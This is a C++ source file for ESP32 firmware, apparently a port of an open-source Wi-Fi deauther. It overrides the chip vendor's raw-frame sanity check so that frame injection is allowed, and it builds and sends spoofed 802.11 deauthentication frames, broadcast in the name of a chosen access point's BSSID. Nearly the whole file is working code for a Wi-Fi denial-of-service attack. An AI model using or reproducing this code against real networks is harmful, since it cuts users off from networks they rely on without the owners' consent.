/**
 * @file wsl_bypasser.cpp
 * @brief WiFi Stack Libraries bypasser — converted to C++
 * @author risinek (risinek@gmail.com) | C++ port: Teuku Maulana (TM26)
 *
 * @note ieee80211_raw_frame_sanity_check() override must remain as C linkage
 *       to correctly replace the symbol at link time.
 */

#include "wsl_bypasser.h"

#include <cstdint>
#include <cstring>
#include <array>

#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char *TAG = "wsl_bypasser";

/**
 * @brief Deauth frame template — broadcast destination, reason: invalid auth (0x02)
 * @see 802.11-2016 [9.4.1.7, Table 9-45]
 */
static constexpr std::array<uint8_t, 26> DEAUTH_FRAME_TEMPLATE = {{
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: AP BSSID (filled at runtime)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled at runtime)
    0xf0, 0xff,
    0x02, 0x00                            // Reason: 0x0002
}};

/**
 * @brief Override sanity check to allow raw 802.11 frame injection
 * @see https://github.com/GANESH-ICMC/esp32-deauther
 */
extern "C" int ieee80211_raw_frame_sanity_check(int32_t /*arg*/, int32_t /*arg2*/, int32_t /*arg3*/) {
    return 0;
}

extern "C" void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false));
}

extern "C" void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record) {
    ESP_LOGD(TAG, "Sending deauth frame to broadcast...");
    std::array<uint8_t, 26> frame = DEAUTH_FRAME_TEMPLATE;
    // Patch SA (bytes 10–15) and BSSID (bytes 16–21) with target BSSID
    memcpy(&frame[10], ap_record->bssid, 6);
    memcpy(&frame[16], ap_record->bssid, 6);
    wsl_bypasser_send_raw_frame(frame.data(), static_cast<int>(frame.size()));
}
